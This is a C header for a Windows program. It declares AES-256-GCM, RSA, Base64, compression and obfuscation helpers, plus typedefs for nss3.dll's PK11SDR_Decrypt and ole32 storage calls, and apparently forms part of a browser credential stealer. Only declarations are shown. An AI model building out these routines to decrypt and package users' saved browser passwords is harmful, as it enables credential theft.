#ifndef CRYPTO_H
#define CRYPTO_H
#include <windows.h>
#include <unistd.h>
#include <time.h>

extern unsigned char PublicKey[];
int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize);
int Base64EncodingFunc(const BYTE *inputBin, DWORD inputBinSize, char *outputB64, DWORD outputB64Size);
NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const BYTE *aad, ULONG aadLength, const BYTE *iv, ULONG ivLength, const BYTE *authTag, ULONG authTagLength, const BYTE *key, ULONG keyLength, BYTE *decryptedData, ULONG decryptedDataLength);
int CompressFile(const WCHAR **Files, size_t numFiles, const WCHAR *OutputPath);
int RSAEncrypt(char *file, char *fileOut);
char *BizFumEncodingDecode(char *Input);
void Reverse(unsigned char *data, int len);
void XOR(char *input, char *output, const char *key, int length);
void RemoveBytes(unsigned char *ByteArr, int ByteArrLength);
void AddRandomBytes(unsigned char *input, size_t length);


// Typedefs for nss3.dll calls.
typedef enum
{
    siBuffer
} SECItemType;
typedef struct SECItemStr
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
} SECItem;
typedef enum _SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0,
} SECStatus;
typedef int(NSS_InitFunc)(const char *profilePath);
typedef int(PK11SDR_DecryptFunc)(SECItem *data, SECItem *result, void *cx);

// Definitions and structs for ole32.dll calls.
typedef HRESULT (*StgCreateDocfileFunc)(const WCHAR *pwcsName, DWORD grfMode, DWORD reserved, IStorage **ppstgOpen);
typedef HRESULT (*CreateStreamFunc)(IStorage *This, const OLECHAR *pwcsName, DWORD grfMode, DWORD reserved1, DWORD reserved2, IStream **ppstm);
typedef HRESULT (*WriteFunc)(IStream *This, const void *pv, ULONG cb, ULONG *pcbWritten);
typedef HRESULT (*CoInitializeFunc)(LPVOID pvReserved);
typedef void (*CoUninitializeFunc)(void);
typedef ULONG (*ReleaseFunc)(IUnknown *This);









#endif
